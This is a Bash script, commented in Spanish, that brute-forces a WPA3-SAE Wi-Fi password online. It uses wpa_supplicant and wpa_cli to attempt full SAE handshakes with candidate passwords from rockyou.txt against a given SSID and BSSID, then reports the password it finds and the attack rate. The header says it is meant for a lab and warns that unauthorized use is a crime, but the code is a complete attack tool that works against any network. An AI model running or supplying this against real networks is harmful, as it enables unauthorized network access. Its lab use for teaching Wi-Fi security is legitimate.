#!/bin/bash

# ==============================================================================
# DICCIONARIO ONLINE CONTRA WPA3-SAE (laboratorio Wi-Fi, escenario he_wpa3)
#
#   SAE no deja nada crackeable offline: cada contraseña candidata exige un
#   intercambio SAE completo (Commit + Confirm) con el AP. Este script lo hace
#   con wpa_supplicant/wpa_cli, una contraseña por intento, y mide la velocidad
#   para extrapolar cuánto costaría el diccionario entero.
#
#   Uso: sudo ./sae_online.sh -i <interfaz> -s <SSID> -b <BSSID> -c <canal> \
#                             [-w <diccionario>] [-n <max_intentos>] [-t <seg>]
#   Ej.: sudo ./sae_online.sh -i wlan2 -s he_wpa3 -b 02:00:00:00:1a:00 -c 5 -n 200
#
#   La interfaz debe estar libre (modo managed, sin otro wpa_supplicant).
#   SOLO para el laboratorio: atacar redes ajenas sin autorización es delito.
# ==============================================================================

set -u

IFACE=""; SSID=""; BSSID=""; CHAN=""
DICT="/usr/share/wordlists/rockyou.txt"
MAX=200
TMAX=6          # segundos máximos por intento

while getopts "i:s:b:c:w:n:t:" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;  s) SSID="$OPTARG" ;;  b) BSSID="$OPTARG" ;;
    c) CHAN="$OPTARG" ;;   w) DICT="$OPTARG" ;;  n) MAX="$OPTARG" ;;
    t) TMAX="$OPTARG" ;;
    *) echo "Uso: $0 -i IFACE -s SSID -b BSSID -c CANAL [-w DICC] [-n MAX] [-t SEG]"; exit 1 ;;
  esac
done

if [ "$EUID" -ne 0 ]; then echo "[-] Ejecuta como root (sudo)."; exit 1; fi
if [ -z "$IFACE" ] || [ -z "$SSID" ] || [ -z "$BSSID" ] || [ -z "$CHAN" ]; then
  echo "Uso: $0 -i IFACE -s SSID -b BSSID -c CANAL [-w DICC] [-n MAX] [-t SEG]"; exit 1
fi
if [ ! -r "$DICT" ]; then
  if [ -r "$DICT.gz" ]; then
    echo "[-] $DICT no existe, pero sí $DICT.gz. Descomprímelo: sudo gunzip $DICT.gz"
  else
    echo "[-] No se puede leer el diccionario $DICT"
  fi
  exit 1
fi

FREQ=$((2407 + 5 * CHAN))                # canal 2,4 GHz -> MHz
CTRL="/var/run/wpa_supplicant_saeonline"
CLI="wpa_cli -p $CTRL -i $IFACE"

limpiar() {
  $CLI terminate > /dev/null 2>&1
  rm -rf "$CTRL"
}
trap 'echo; echo "[!] Interrumpido."; limpiar; exit 130' INT TERM

# Interfaz en managed y wpa_supplicant propio, sin redes configuradas
ip link set "$IFACE" down
iw dev "$IFACE" set type managed
ip link set "$IFACE" up
mkdir -p "$CTRL"
wpa_supplicant -B -D nl80211 -i "$IFACE" -C "$CTRL" > /dev/null || { echo "[-] No arranca wpa_supplicant"; exit 1; }
sleep 1

NET=$($CLI add_network | tail -n 1)
$CLI set_network "$NET" ssid "\"$SSID\""      > /dev/null
$CLI set_network "$NET" key_mgmt SAE          > /dev/null
$CLI set_network "$NET" ieee80211w 2          > /dev/null
$CLI set_network "$NET" bssid "$BSSID"        > /dev/null
$CLI set_network "$NET" scan_freq "$FREQ"     > /dev/null

# Un intento: devuelve 0 si la conexión llega a COMPLETED
intento() {
  local pw="$1" st visto=0 t
  $CLI set_network "$NET" sae_password "\"$pw\"" > /dev/null
  $CLI select_network "$NET" > /dev/null       # también quita bloqueos temporales
  for ((t = 0; t < TMAX * 5; t++)); do
    st=$($CLI status 2>/dev/null | sed -n 's/^wpa_state=//p')
    case "$st" in
      COMPLETED) return 0 ;;
      AUTHENTICATING|ASSOCIATING|ASSOCIATED|4WAY_HANDSHAKE|GROUP_HANDSHAKE) visto=1 ;;
      SCANNING|DISCONNECTED|INACTIVE) [ "$visto" -eq 1 ] && break ;;
    esac
    sleep 0.2
  done
  $CLI disconnect > /dev/null
  return 1
}

echo "[+] Objetivo: $SSID ($BSSID, canal $CHAN)  Diccionario: $DICT (máx. $MAX)"
N=0
INICIO=$(date +%s)
while IFS= read -r PW && [ "$N" -lt "$MAX" ]; do
  PW="${PW%$'\r'}"
  # Se saltan vacías y las que llevan comillas o barras (rompen wpa_cli)
  case "$PW" in ""|*\"*|*\\*) continue ;; esac
  N=$((N + 1))
  printf "\r[%4d] Probando: %-30s" "$N" "$PW"
  if intento "$PW"; then
    FIN=$(date +%s); DUR=$((FIN - INICIO)); [ "$DUR" -eq 0 ] && DUR=1
    echo
    echo "[✓] CONTRASEÑA ENCONTRADA: '$PW'  ($N intentos en ${DUR} s)"
    awk -v n="$N" -v d="$DUR" 'BEGIN { r = n / d; printf "    Velocidad: %.2f intentos/s -> rockyou completo (14,3 M): %.0f días\n", r, 14344391 / r / 86400 }'
    limpiar
    exit 0
  fi
done < "$DICT"

FIN=$(date +%s); DUR=$((FIN - INICIO)); [ "$DUR" -eq 0 ] && DUR=1
echo
echo "[-] No encontrada en $N intentos (${DUR} s)."
awk -v n="$N" -v d="$DUR" 'BEGIN { r = n / d; printf "    Velocidad: %.2f intentos/s -> rockyou completo (14,3 M): %.0f días\n", r, 14344391 / r / 86400 }'
limpiar
exit 1
